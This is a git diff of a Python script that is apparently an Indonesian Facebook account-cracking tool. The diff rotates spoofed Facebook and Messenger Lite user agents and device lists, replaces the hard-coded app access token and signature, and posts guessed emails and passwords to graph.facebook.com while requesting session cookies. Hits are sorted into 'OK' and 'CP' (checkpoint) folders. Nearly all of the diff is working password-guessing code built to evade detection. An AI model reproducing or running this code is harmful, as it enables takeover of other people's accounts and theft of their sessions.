@@ -46,21 +46,21 @@ versi_app = str(random.randint(111111111,999999999))
 ###----------[ GENERATE USERAGENT ]---------- ###
 for z in range(200):
 	versi_android = str(random.randint(4,12))+".0.0"
-	versi_chrome = str(random.randint(100,325))+".0.0."+str(random.randint(4500,5500))+"."+str(random.randint(40,150))
+	versi_chrome = str(random.randint(100,450))+".0.0."+str(random.randint(1,10))+"."+str(random.randint(100,250))
 	rc = random.choice; rr = random.randint
 	android = str(random.randint(4,12))
-	aplikasi_versi = str(random.randint(100,299))+".0.0.0"
-	device = random.choice(["SM-A405FN Build/NHG47L","SM-A346M Build/LMY47V","SM-J415FN Build/N4F26T","SM-X706B Build/OPM5.171019.014","SM-J337R4 Build/OPR6.170623.023","SM-J810M Build/OPM5.171019.015","SM-T280 Build/MMB29K"])
+	aplikasi_versi = str(random.randint(100,299))+".0.0.0"	
+	device = random.choice(["SM-J320FN Build/LMY47V","NEO-X7-216A Build/XRN68H","STK-LX3 Build/HUAWEISTK-LX3","BTV-W09 Build/HUAWEIBEETHOVEN-W09","CLT-AL00 Build/HUAWEICLT-AL00","LYA-AL10 Build/HUAWEILYA-AL10","ELE-L29 Build/HUAWEIELE-L29","DIG-AL00 Build/HUAWEIDIG-AL00","EVA-L09 Build/HUAWEIEVA-L09"])
 	dev = device.split(" Build/")[0]
 	az = "A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"
 	build = f"{random.choice(az)}{random.choice(az)}{random.choice(az)}{random.randint(10, 90)}{random.choice(az)}"
 	versi = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
 	verchrome = random.choice(["602.1.50","602.2.14","602.3.12","602.4.6","603.1.30","603.2.4","603.3.8","601.1.46"])
 	mob = random.choice(["14A456","14B100","14C92","14D27","14E304","14F89","14G60","13C75","13D15","13E233","13E238","13F69","13G34","13G36"])
-	ua = f"Dalvik/2.1.0 (Linux; U; Android {android}; SM-F926B Build/TP1A.220624.014; wv) [FBAN/FB4A;FBAV/114.0.5735.196;FBBV/443811157;FBRV/0;FBLC/id_ID;FBMF/Samsung;FBBD/Samsung;FBDV/SM-F926B;FBSV/"+f"{android};FBCA/x86_64:x86:arm64-v8a:armeabi-v7a:armeabi;FBDM/"+"{density=1.5,width=1600,height=900}"+";FB_FW/1;]"
+	ua = f"[FBAN/MessengerLite;FBAV/{versi_chrome};FBBV/{str(rr(111111111,999999999))};FBDM/"+"{density=2.625,width=1080,height=1794};"+f"FBLC/en_US;FBRV/0;FBCR/Verizon;FBMF/Google;FBBD/google;FBPN/com.facebook.mlite;FBDV/Pixel 2;FBSV/{versi_android};FBBK/1;FBOP/1;FBCA/arm64-v8a]"
 	if ua in ugent:pass
 	else:ugent.append(ua)
-		
+	
 ###----------[ LOGO AUTHOR DAN VERSI]---------- ###
 class Logo:
 	
@@ -146,8 +146,7 @@ class Login:
 			pass
 		
 ###----------[ BAGIAN MENU ]---------- ###
-class Menu:
-	
+class Menu:	
 	###----------[ FUNCTION INIT ]---------- ###
 	def __init__(self):
 		self.men = []
@@ -477,21 +476,21 @@ class Crack:
 							
 	###----------[ METODE API ]---------- ###
 	def metode_api(self,email,pwx):
-		prog.update(des,description=f" {H2}•{P2}{H2}RIZKI378•{P2} {str(self.loop)}/{len(tampung)} OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}")
+		prog.update(des,description=f" {H2}•{P2}{H2}[RIZKI378]•{P2} {str(self.loop)}/{len(tampung)} OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}")
 		prog.advance(des)
 		try:
 			for pw in pwx:
 				pw = pw.lower()
 				ua = random.choice(ugent)
 				params = {
-					"access_token": "1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae",
+					"access_token": "6628568379|c1e620fa708a1d5696fb991c1bde5662",
 					"sdk_version": f"{str(random.randint(1,26))}", 
 					"email": email,
 					"locale": "en_US",
 					"password": pw,
 					"sdk": "android",
 					"generate_session_cookies": "1",
-					"sig": "1479723375646806"
+					"sig": "6628568379"
 				}
 				headers = {
 					"Host": "graph.facebook.com",
@@ -737,17 +736,16 @@ class Session:
 	def generate_ugent(self):
 		versi_android = random.randint(4,12)
 		versi_chrome = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
-		versi_app = random.randint(410000000,499999999)
-		device = random.choice(["VOG-L29 Build/HUAWEIVOG-L29","STK-LX3 Build/HUAWEISTK-LX3","BTV-W09 Build/HUAWEIBEETHOVEN-W09","CLT-AL00 Build/HUAWEICLT-AL00","LYA-AL10 Build/HUAWEILYA-AL10","ELE-L29 Build/HUAWEIELE-L29","DIG-AL00 Build/HUAWEIDIG-AL00","EVA-L09 Build/HUAWEIEVA-L09"])
+		versi_app = random.randint(111111111,999999999)
+		device = random.choice(["SM-J320FN Build/LMY47V","NEO-X7-216A Build/XRN68H","STK-LX3 Build/HUAWEISTK-LX3","BTV-W09 Build/HUAWEIBEETHOVEN-W09","CLT-AL00 Build/HUAWEICLT-AL00","LYA-AL10 Build/HUAWEILYA-AL10","ELE-L29 Build/HUAWEIELE-L29","DIG-AL00 Build/HUAWEIDIG-AL00","EVA-L09 Build/HUAWEIEVA-L09","5.1.1; F1 Build/LMY47V"])
 		density = random.choice(["{density=3.0,width=1080,height=1920}","{density=2.0,width=720,height=1412}","{density=1.5, width=480, height=800}"])
 		ugent = f"Davik/2.1.0 (Linux; U; Android {android_version}; {model_device} Build/{build_device}) [FBAN/MessengerLite;FBAV/{versi_chrome};FBPN/com.facebook.mlite;FBLC/{language};FBBV/{versi_app};FBCR/{simcard};FBMF/{merk_device};FBBD/{brand_device};FBDV/{model_device};FBSV/{android_version};FBCA/{cpu_device};FBDM/"+str(density)+";]"
 		return ugent
-		
 if __name__=="__main__":
 	try:os.system('git pull')
 	except:pass
 	try:os.system('pkg install play-audio')
-	except:pass
+	except:pass	
 	try:os.mkdir("OK")
 	except:pass
 	try:os.mkdir("CP")
